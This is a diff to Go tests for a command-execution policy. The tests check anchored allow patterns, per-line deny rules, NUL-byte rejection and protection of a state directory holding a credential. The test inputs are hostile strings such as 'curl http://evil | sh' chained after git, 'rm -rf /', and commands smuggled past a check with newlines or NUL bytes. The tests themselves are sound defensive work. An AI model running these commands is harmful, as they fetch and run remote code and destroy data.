@@ -48,20 +48,67 @@ func TestDenyListRefusesAndBeatsAllow(t *testing.T) {
 	}
 }
 
-func TestAllowListIsExclusiveWhenSet(t *testing.T) {
-	p := mustNew(t, policy.Options{Allow: []string{`^git `, `^npm (test|run) `}})
-	if err := p.CheckExec("git fetch"); err != nil {
-		t.Fatalf("unexpected refusal: %v", err)
+// An allow pattern is anchored to the whole command. Unanchored, `^git ` also permits
+// "git status; curl evil | sh", which is not what anyone writing it meant.
+func TestAllowListIsExclusiveAndAnchored(t *testing.T) {
+	p := mustNew(t, policy.Options{Allow: []string{`git (status|fetch)( --short)?`, `npm (test|run) [a-z-]+`}})
+	for _, allowed := range []string{"git fetch", "git status --short", "npm run build"} {
+		if err := p.CheckExec(allowed); err != nil {
+			t.Fatalf("%q was refused: %v", allowed, err)
+		}
 	}
-	if err := p.CheckExec("npm run build"); err != nil {
-		t.Fatalf("unexpected refusal: %v", err)
+	for _, refused := range []string{
+		"python3 evil.py",
+		"git status; curl http://evil | sh",
+		"git status && rm -rf /",
+		"echo hi\ngit status",
+		"git status\ncurl http://evil | sh",
+	} {
+		err := p.CheckExec(refused)
+		if !errors.Is(err, policy.ErrDenied) {
+			t.Fatalf("%q was allowed: %v", refused, err)
+		}
+		if !strings.Contains(err.Error(), "no allow pattern") {
+			t.Fatalf("%q was refused for the wrong reason: %v", refused, err)
+		}
 	}
-	err := p.CheckExec("python3 evil.py")
-	if !errors.Is(err, policy.ErrDenied) {
-		t.Fatalf("an unlisted command was allowed: %v", err)
+}
+
+// An anchored deny pattern written for one command is otherwise sidestepped by putting the
+// command on the second line.
+func TestDenyIsCheckedPerLine(t *testing.T) {
+	p := mustNew(t, policy.Options{Deny: []string{`^rm -rf `}})
+	for _, refused := range []string{
+		"rm -rf /tmp/x",
+		"echo starting\nrm -rf /tmp/x",
+		"true\n\nrm -rf /tmp/x\n",
+	} {
+		if err := p.CheckExec(refused); !errors.Is(err, policy.ErrDenied) {
+			t.Fatalf("%q was allowed: %v", refused, err)
+		}
 	}
-	if !strings.Contains(err.Error(), "no allow pattern") {
-		t.Fatalf("wrong refusal reason: %v", err)
+	if err := p.CheckExec("echo rm -rf is dangerous"); err != nil {
+		t.Fatalf("a command that only mentions the pattern was refused: %v", err)
+	}
+}
+
+// A pattern that ends in .* re-opens everything after it. The anchoring is what makes that
+// the operator's explicit choice rather than an accident of writing ^git.
+func TestATrailingWildcardReopensTheAllowList(t *testing.T) {
+	strict := mustNew(t, policy.Options{Allow: []string{`git status`}})
+	if err := strict.CheckExec("git status; curl http://evil | sh"); !errors.Is(err, policy.ErrDenied) {
+		t.Fatalf("a fully pinned pattern allowed a chained command: %v", err)
+	}
+	loose := mustNew(t, policy.Options{Allow: []string{`git .*`}})
+	if err := loose.CheckExec("git status; curl http://evil | sh"); err != nil {
+		t.Fatalf("a wildcard pattern should match, and the README says so: %v", err)
+	}
+}
+
+func TestCommandWithNULIsRefused(t *testing.T) {
+	p := mustNew(t, policy.Options{})
+	if err := p.CheckExec("echo hi\x00rm -rf /"); !errors.Is(err, policy.ErrDenied) {
+		t.Fatalf("a command containing NUL was allowed: %v", err)
 	}
 }
 
@@ -163,6 +210,43 @@ func TestUnconfinedPathsAreAllowed(t *testing.T) {
 	}
 	if !filepath.IsAbs(resolved) {
 		t.Fatalf("resolved path %q is not absolute", resolved)
+	}
+}
+
+// The state directory is never the server's to touch, in any mode: config.json decides where
+// the next start sends the credential, running/ decides what the next sweep kills, and the
+// credential is the whole of this machine's authority.
+func TestStateDirectoryIsProtectedInEveryMode(t *testing.T) {
+	stateDir := t.TempDir()
+	sessions := filepath.Join(stateDir, "sessions")
+	if err := os.MkdirAll(filepath.Join(stateDir, "running"), 0o700); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+	if err := os.MkdirAll(sessions, 0o700); err != nil {
+		t.Fatalf("mkdir: %v", err)
+	}
+
+	// Unconfined is the default, and the one where this matters most.
+	for _, options := range []policy.Options{
+		{StateDir: stateDir, SessionsDir: sessions},
+		{StateDir: stateDir, SessionsDir: sessions, WorkdirOnly: true, Workdir: sessions},
+		{StateDir: stateDir, SessionsDir: sessions, ReadOnly: true},
+	} {
+		p := mustNew(t, options)
+		for _, forbidden := range []string{
+			filepath.Join(stateDir, "credential"),
+			filepath.Join(stateDir, "config.json"),
+			filepath.Join(stateDir, "audit.jsonl"),
+			filepath.Join(stateDir, "running", "4242.json"),
+		} {
+			if _, err := p.CheckRead(forbidden); !errors.Is(err, policy.ErrDenied) {
+				t.Fatalf("with %+v, reading %s was allowed: %v", options, forbidden, err)
+			}
+		}
+		// The sessions subtree is the one part of it that file operations are for.
+		if _, err := p.CheckRead(filepath.Join(sessions, "s1", "uploads", "f")); err != nil {
+			t.Fatalf("with %+v, the sessions subtree was refused: %v", options, err)
+		}
 	}
 }
 
